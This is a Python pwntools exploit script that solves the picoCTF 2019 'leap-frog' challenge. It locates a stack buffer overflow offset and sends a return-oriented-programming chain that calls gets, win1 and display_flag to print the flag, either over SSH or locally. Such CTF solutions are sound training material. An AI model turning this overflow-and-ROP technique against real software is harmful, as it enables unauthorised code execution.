#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --user xxx --pass 'xxx' --path /problems/leap-frog_4_32907c7b6e253bd5d9422083e7243619/rop
from pwn import *
import sys

# Set up pwntools for the correct architecture
# ELF tutorial: https://github.com/Gallopsled/pwntools-tutorial/blob/master/elf.md
exe = context.binary = ELF('rop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 22)
user = args.USER
password = args.PASSWORD
remote_path = '/problems/leap-frog_4_32907c7b6e253bd5d9422083e7243619/rop'
remote_dir = '/problems/leap-frog_4_32907c7b6e253bd5d9422083e7243619'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        # `cwd` is needed here because the `rop` executable does not use absolute paths, so we
        # must be in the folder that contains the flag.
        return shell.process([remote_path] + argv, cwd=remote_dir, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


def get_overflow_offset():
    proc = process(exe.path)
    payload = cyclic(50, n = exe.bytes)
    proc.sendlineafter("Enter your input> ", payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n=exe.bytes)
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

overflow_offset = get_overflow_offset()

gets_plt = exe.plt["gets"]
win1_addr = exe.symbols["win1"]
display_flag_addr = exe.symbols["display_flag"]

log.info("gets_plt address: {}".format(hex(gets_plt)))
log.info("win1 address: {}".format(hex(win1_addr)))
log.info("display_flag() address: {}".format(hex(display_flag_addr)))

# `fit()` documentation: https://pwntools.readthedocs.io/en/latest/util/packing.html#pwnlib.util.packing.flat
payload = fit({overflow_offset: [gets_plt, display_flag_addr, win1_addr]})

io = start()

io.sendlineafter("Enter your input> ", payload)
io.sendline('\x01'*3)
flag = io.recvuntil("}")
log.success(flag)


# Version that can be run on shell server:
# from pwn import *

# exe = context.binary = ELF('rop')

# gets_plt = exe.plt["gets"]
# win1_addr = exe.symbols["win1"]
# display_flag_addr = exe.symbols["display_flag"]

# log.info("gets_plt address: {}".format(hex(gets_plt)))
# log.info("win1 address: {}".format(hex(win1_addr)))
# log.info("display_flag() address: {}".format(hex(display_flag_addr)))

# payload = fit({28: [gets_plt, display_flag_addr, win1_addr]})

# p = process("./rop")
# p.recvuntil('> ')
# p.sendline(payload)
# p.sendline('\x01\x01\x01\x00')
# print("Flag: " + p.recvuntil('}'))